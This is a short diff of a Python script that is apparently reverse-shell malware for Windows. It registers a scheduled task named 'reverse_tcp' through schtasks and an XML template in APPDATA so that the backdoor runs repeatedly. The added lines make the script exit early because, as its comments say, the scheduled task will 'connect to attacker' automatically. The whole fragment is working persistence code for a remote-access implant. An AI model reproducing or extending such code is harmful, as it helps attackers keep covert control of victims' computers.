@@ -65,6 +65,8 @@ def generateScheduleTask(schedule_interval_minutes):
 </Task>
     """
 
+### For Windows system
+### Initialize necessary settings.
 if (platform.system() == "Windows"):
     ### Get APPDATA path
     appdata_path = os.getenv("APPDATA");
@@ -89,6 +91,10 @@ if (platform.system() == "Windows"):
         ### The the name of schedule task is reverse_tcp
         os.system("schtasks /CREATE /XML " + appdata_path + "\\schtasks_template.xml /TN reverse_tcp")
         ## os.system("schtasks /CREATE /SC MINUTE /MO 30 /TN reverse_tcp /TR %Appdata%\\reverse_tcp.exe")
+
+        ### As the scheduled task already starts, no need to connect to attacker now.
+        ### It will connect automatically soon.
+        sys.exit(0)
 
 
 if len(sys.argv) >= 2:
